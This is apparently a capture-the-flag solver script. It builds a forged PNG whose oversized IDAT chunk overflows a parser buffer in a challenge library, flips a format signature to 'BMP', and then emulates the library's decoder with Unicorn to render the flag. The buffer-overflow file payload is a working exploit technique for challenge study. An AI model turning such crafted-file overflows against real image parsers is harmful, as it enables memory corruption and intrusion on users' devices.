import os
import sys
import struct
import zlib
from unicorn import Uc, UC_ARCH_X86, UC_MODE_64
from unicorn.x86_const import UC_X86_REG_RBP, UC_X86_REG_RSP
from PIL import Image

def generate_exploit_png(output_path):
    """
    Generates the forged PNG file that triggers the flag generation
    inside the Android challenge app (libparser.so).
    
    Mechanism:
    - Normal PNG starts with \x89PNG and an IHDR chunk (10x10, 8-bit RGB).
    - parseImage allocates: stride * height + 16 bytes = 32 * 10 + 16 = 336 bytes.
    - Initial trailer at offset 320 is set to "PNG\x00...".
    - When reading the IDAT chunk, parseImage reads chunk_len bytes directly into the buffer.
    - Supplying chunk_len = 324 causes the 4 bytes at offset 320 to be overwritten with "BMP\x00".
    - The signature matches "BMP", causing parseImage to dispatch to parse_bmp(),
      which decodes the embedded glyph table and outputs the flag as .modified.bmp!
    """
    def make_chunk(ctype, data):
        return struct.pack(">I", len(data)) + ctype + data + struct.pack(">I", zlib.crc32(ctype + data) & 0xffffffff)

    # 1. Standard PNG Signature
    png_sig = b"\x89PNG\r\n\x1a\n"

    # 2. IHDR Chunk: 10x10, 8-bit depth, Truecolor (RGB = 2)
    ihdr_data = struct.pack(">IIBBBBB", 10, 10, 8, 2, 0, 0, 0)
    ihdr_chunk = make_chunk(b"IHDR", ihdr_data)

    # 3. Forged IDAT Chunk:
    # 320 bytes non-zero pixel data + 4 bytes "BMP\x00" to overwrite the driver signature
    idat_payload = b"\x01" * 320 + b"BMP\x00"
    idat_chunk = make_chunk(b"IDAT", idat_payload)

    # 4. IEND Chunk
    iend_chunk = make_chunk(b"IEND", b"")

    full_payload = png_sig + ihdr_chunk + idat_chunk + iend_chunk

    with open(output_path, "wb") as f:
        f.write(full_payload)
    print(f"[+] Successfully generated exploit image: {output_path} ({len(full_payload)} bytes)")
    return output_path

def render_flag_from_binary(lib_path, output_bmp_path):
    """
    Directly emulates the parse_bmp rendering routine extracted from libparser.so
    using the Unicorn engine in the virtual environment.
    """
    print(f"[*] Loading native library for emulation: {lib_path}")
    with open(lib_path, "rb") as f:
        elf_data = f.read()

    # Memory Layout for Unicorn x86_64 emulation
    CODE_ADDR = 0x60000
    CODE_SIZE = 0x20000
    STACK_ADDR = 0x100000
    STACK_SIZE = 0x20000
    DATA_ADDR = 0x40000
    DATA_SIZE = 0x10000

    mu = Uc(UC_ARCH_X86, UC_MODE_64)
    mu.mem_map(CODE_ADDR, CODE_SIZE)
    mu.mem_map(STACK_ADDR, STACK_SIZE)
    mu.mem_map(DATA_ADDR, DATA_SIZE)
    mu.mem_write(CODE_ADDR, elf_data[CODE_ADDR:CODE_ADDR+CODE_SIZE])
    mu.mem_write(DATA_ADDR, elf_data[DATA_ADDR:DATA_ADDR+DATA_SIZE])

    # In parseImage: val = ((('P'^'G') << 16) | (('M'^'N') << 8) | ('B'^'P')) = 0x170312
    val = 0x170312
    num_chars = val ^ 0x170304  # 22 characters
    width = num_chars * 32 + 80 # 784
    height = 144                # 144

    img = Image.new("RGB", (width, height), (255, 255, 255))

    print(f"[*] Emulating native glyph decoder (num_chars={num_chars}, dimensions={width}x{height})...")
    base_x = 40
    for i in range(num_chars):
        for j in range(16):
            rbp = STACK_ADDR + 0x10000
            rsp = rbp - 0x300
            mu.reg_write(UC_X86_REG_RBP, rbp)
            mu.reg_write(UC_X86_REG_RSP, rsp)
            mu.mem_write(rbp + 0x10, struct.pack("<I", val))
            mu.mem_write(rbp - 0x270, struct.pack("<Q", i))
            mu.mem_write(rbp - 0x274, struct.pack("<I", j))
            mu.mem_write(rbp - 0x278, struct.pack("<I", 0))

            # Emulate the character decoder dispatch from 0x6bc39 to 0x6c8bc
            mu.emu_start(0x6bc39, 0x6c8bc)
            byte_val = struct.unpack("<I", mu.mem_read(rbp - 0x278, 4))[0] & 0xff

            for bit in range(8):
                if (byte_val >> (7 - bit)) & 1:
                    for dy in range(4):
                        for dx in range(4):
                            x = base_x + bit * 4 + dx
                            visual_y = height - 1 - ((15 - j) * 4 + 40 + dy)
                            if 0 <= x < width and 0 <= visual_y < height:
                                img.putpixel((x, visual_y), (0, 0, 0))
        base_x += 32

    img.save(output_bmp_path)
    print(f"[+] Rendered flag bitmap saved to: {output_bmp_path}")

    # Print clean ASCII preview
    print("\n" + "=" * 90)
    print("                     VISUAL FLAG EXTRACTED FROM libparser.so")
    print("=" * 90)
    for y in range(0, height, 4):
        line = "".join("#" if img.getpixel((x, y)) != (255, 255, 255) else " " for x in range(0, width, 4))
        if line.strip():
            print(line)
    print("=" * 90 + "\n")

def main():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    exploit_png_path = os.path.join(base_dir, "forged_payload_bmp.png")
    output_bmp_path = os.path.join(base_dir, "flag_rendered.bmp")
    lib_path = os.path.join(base_dir, "binaries/libparser.so")
    if not os.path.exists(lib_path):
        lib_path = os.path.join(base_dir, "../ctf/challenge2/lib/x86_64/libparser.so")

    print("[*] Starting CTF Solver...")
    # Step 1: Generate the challenge exploit image
    generate_exploit_png(exploit_png_path)

    # Step 2: Render the resulting flag image from the binary
    if os.path.exists(lib_path):
        render_flag_from_binary(lib_path, output_bmp_path)
    else:
        print(f"[-] libparser.so not found at {lib_path}")

if __name__ == "__main__":
    main()
